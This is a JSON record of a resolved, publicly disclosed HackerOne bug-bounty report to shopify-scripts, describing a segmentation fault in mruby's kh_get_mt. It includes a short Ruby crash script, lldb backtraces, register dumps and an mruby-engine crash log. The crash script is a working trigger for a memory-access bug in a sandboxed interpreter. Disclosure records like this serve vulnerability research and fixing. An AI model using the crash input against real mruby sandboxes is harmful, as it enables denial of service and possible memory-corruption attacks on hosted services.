@@ -1,0 +1,115 @@
+{
+  "id": 188313,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODgzMTM=",
+  "url": "https://hackerone.com/reports/188313",
+  "title": "Segmentation fault due to bad memory access in kh_get_mt",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-05T02:03:56.063Z",
+  "submitted_at": "2016-12-05T02:03:56.063Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haquaman",
+    "url": "/haquaman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-17T20:07:37.420Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-17T20:07:37.336Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T20:12:38.681Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Crash file is:\n\n```\nvalues=[0,0,0,0]\nunused_but_needed=[]\nHash=[]\nvalues.each do\n  values.each do\n    values & values.each do\n      values.each do\n        %  [0]=nil\n      end\n    end\n  end\nend\n```\n\n```\n $ ./dev/bin/mruby crash.rb\nSegmentation fault: 11\n\n```\n\n```\n$ lldb ./dev/bin/mruby crash.rb\n(lldb) target create \"./dev/bin/mruby\"\nCurrent executable set to './dev/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 27834 launched: './dev/bin/mruby' (x86_64)\nProcess 27834 stopped\n* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)\n    frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38\nmruby`kh_get_mt:\n->  0x100006cb6 <+38>: movl   (%rsi), %eax\n    0x100006cb8 <+40>: subl   $0x1, %eax\n    0x100006cbb <+43>: andl   %eax, %edx\n    0x100006cbd <+45>: movl   %edx, -0x20(%rbp)\n(lldb) bt\n* thread #1: tid = 0x879ccd0, 0x0000000100006cb6 mruby`kh_get_mt + 38, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)\n  * frame #0: 0x0000000100006cb6 mruby`kh_get_mt + 38\n    frame #1: 0x000000010000ba80 mruby`mrb_method_search_vm + 80\n    frame #2: 0x000000010003f8b9 mruby`mrb_vm_exec + 5881\n    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135\n    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100\n    frame #5: 0x0000000100071adf mruby`load_exec + 1183\n    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67\n    frame #7: 0x00000001000017d8 mruby`main + 904\n    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x0000000000000025\n       rbx = 0x0000000000000000\n       rcx = 0x00000001002028a0\n       rdx = 0x00000000000002eb\n       rdi = 0x00000001002029f0\n       rsi = 0x0000000000000080\n       rbp = 0x00007fff5fbfc9f0\n       rsp = 0x00007fff5fbfc9f0\n        r8 = 0x00000001002029ff\n        r9 = 0x00007fff5fbfc9b0\n       r10 = 0xf100d311ef8d6921\n       r11 = 0x0000000000000001\n       r12 = 0x0000000000000000\n       r13 = 0x0000000000000000\n       r14 = 0x0000000000000000\n       r15 = 0x0000000000000000\n       rip = 0x0000000100006cb6  mruby`kh_get_mt + 38\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nAnother lldb run with symbols to see what class is in the `mrb_method_search_vm`\n\n```\n$ lldb ./mruby/bin/mruby crash.rb\n(lldb) target create \"./mruby/bin/mruby\"\nCurrent executable set to './mruby/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 95246 launched: './mruby/bin/mruby' (x86_64)\nnt = 3\nnt = 17\nnt = 24\nnt = 35\nnt = 51\nnt = 51\nnt = 51\nnt = 51\nnt = 24\nnt = 35\nnt = 24\nnt = 35\nnt = 29\nnt = 40\nnt = 4\nnt = 17\nnt = 29\nnt = 40\nnt = 4\nnt = 17\nnt = 29\nnt = 40\nnt = 29\nnt = 40\nnt = 4\nnt = 17\nnt = 29\nnt = 40\nnt = 4\nnt = 17\nnt = 24\nnt = 87\nnt = 56\nnt = 51\nin gen_send\nin gen_send\nin gen_send\nin gen_send\nin gen_send\nin gen_send\nProcess 95246 stopped\n* thread #1: tid = 0x87adab7, 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x80)\n    frame #0: 0x0000000100006436 mruby`kh_get_mt(mrb=0x0000000100202c80, h=0x0000000000000080, key=150) + 38 at class.c:19\n   16   #include <mruby/data.h>\n   17   #include <mruby/istruct.h>\n   18\n-> 19   KHASH_DEFINE(mt, mrb_sym, struct RProc*, TRUE, kh_int_hash_func, kh_int_hash_equal)\n   20\n   21   void\n   22   mrb_gc_mark_mt(mrb_state *mrb, struct RClass *c)\n(lldb) up\nframe #1: 0x000000010000b200 mruby`mrb_method_search_vm(mrb=0x0000000100202c80, cp=0x00007fff5fbfd478, mid=150) + 80 at class.c:1225\n   1222     khash_t(mt) *h = c->mt;\n   1223\n   1224     if (h) {\n-> 1225       k = kh_get(mt, mrb, h, mid);\n   1226       if (k != kh_end(h)) {\n   1227         m = kh_value(h, k);\n   1228         if (!m) break;\n(lldb) up\nframe #2: 0x000000010003f039 mruby`mrb_vm_exec(mrb=0x0000000100202c80, proc=0x0000000100805810, pc=0x0000000100091124) + 5881 at vm.c:1116\n   1113         }\n   1114       }\n   1115       c = mrb_class(mrb, recv);\n-> 1116       m = mrb_method_search_vm(mrb, &c, mid);\n   1117       if (!m) {\n   1118         mrb_value sym = mrb_symbol_value(mid);\n   1119         mrb_sym missing = mrb_intern_lit(mrb, \"method_missing\");\n(lldb) p *c\n(RClass) $0 = {\n  tt = MRB_TT_STRING\n  color = 2\n  flags = 0\n  c = 0x000000010080ccb0\n  gcnext = 0x0000000000000000\n  iv = 0x0000000000000000\n  mt = 0x0000000000000080\n  super = 0x0000000100700470\n}\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nAlso affects `mruby-engine`.\n\n```\n./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000080\nruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n\n-- Crash Report log information --------------------------------------------\n   See Crash Report log file under the one of following:\n     * ~/Library/Logs/CrashReporter\n     * /Library/Logs/CrashReporter\n     * ~/Library/Logs/DiagnosticReports\n     * /Library/Logs/DiagnosticReports\n   for more details.\nDon't forget to include the above Crash Report log file in bug reports.\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval\nc:0002 p:0214 s:0006 E:0001f0 EVAL   ./bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:000570 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./bin/sandbox:20:in `<main>'\n./bin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n rax: 0x00000000000002eb rbx: 0x0000000107c48af8 rcx: 0x0000000000000000\n rdx: 0x0000000000000096 rdi: 0x0000000107c36440 rsi: 0x00007fff58a19190\n rbp: 0x00007fff58a18f50 rsp: 0x00007fff58a18f28  r8: 0x0000000000000001\n  r9: 0x0000000107bb9104 r10: 0x0000000107bb9100 r11: 0x0000000107c48b00\n r12: 0x0000000000000096 r13: 0x0000000000000096 r14: 0x0000000000000080\n r15: 0x0000000107c3fc20 rip: 0x0000000107b198e9 rfl: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n0   ruby                                0x00000001073835d4 rb_vm_bugreport + 388\n1   ruby                                0x0000000107225023 rb_bug_context + 483\n2   ruby                                0x00000001072f8653 sigsegv + 83\n3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n4   mruby_engine.bundle                 0x0000000107b198e9 mrb_method_search_vm + 89\n5   ???                                 0x0000000107c48af8 0x0 + 4425288440\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ./bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n<snip various gems>\n  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\n```\n\nI haven't worked out the ideal place for a patch yet.\n\nCheers,\n\nHugh",
+  "bounty_amount": "8000.0",
+  "formatted_bounty": "$8,000",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-01-15T20:12:38.753Z",
+  "allow_singular_disclosure_after": -293829251.8679009,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "madrobot",
+    "eveeez",
+    "c12316651",
+    "spetr0x"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
